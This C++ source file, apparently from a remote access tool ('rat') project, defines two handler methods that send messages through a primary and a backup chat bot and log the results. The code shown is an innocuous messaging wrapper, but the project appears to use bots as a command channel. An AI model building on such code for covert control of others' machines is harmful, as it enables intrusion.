#include "rat/Handler.hpp"
#include "rat/handler/debug.hpp"
#include "rat/tbot/types.hpp"

namespace rat::handler {

void Handler::sendMessage(const std::string &Message_Text) {
  if (this->bot->sendMessage(Message_Text) ==
      ::rat::tbot::BotResponse::SUCCESS) {
    HANDLER_DEBUG_LOG("Succeeded at sending: {}", Message_Text);
    this->bot_net_ops_counter++;
  } else {
    HANDLER_ERROR_LOG("Failed at sending: {}", Message_Text);
  }
}

void Handler::sendBackingMessage(const std::string &Message_Text) {
  this->backing_bot_mutex.lock();
  if (this->backing_bot->sendMessage(Message_Text) ==
      ::rat::tbot::BotResponse::SUCCESS) {
    HANDLER_DEBUG_LOG("Succeeded at sending: {}", Message_Text);
    this->backing_bot_net_ops_counter++;
  } else {
    HANDLER_ERROR_LOG("Failed at sending: {}", Message_Text);
  }
  this->backing_bot_mutex.unlock();
}

} // namespace rat::handler
